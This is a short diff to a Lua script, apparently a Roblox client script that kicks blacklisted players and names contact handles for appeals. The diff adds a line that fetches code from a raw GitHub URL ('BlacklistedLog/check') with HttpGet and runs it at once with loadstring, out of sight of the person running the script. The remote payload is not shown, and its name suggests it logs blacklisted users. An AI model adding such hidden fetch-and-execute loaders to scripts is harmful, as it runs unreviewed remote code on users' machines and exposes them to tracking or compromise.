@@ -3,4 +3,6 @@ BlackList = {}
 
 if table.find(BlackList, game:GetService("Players").LocalPlayer.UserId) then
     game:GetService("Players").LocalPlayer:Kick("Blacklisted, Think this was a mistake? DM KaiW#4990 or FrostyW9330")
+    
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Hax0963/BlacklistedLog/main/check'))()
 end
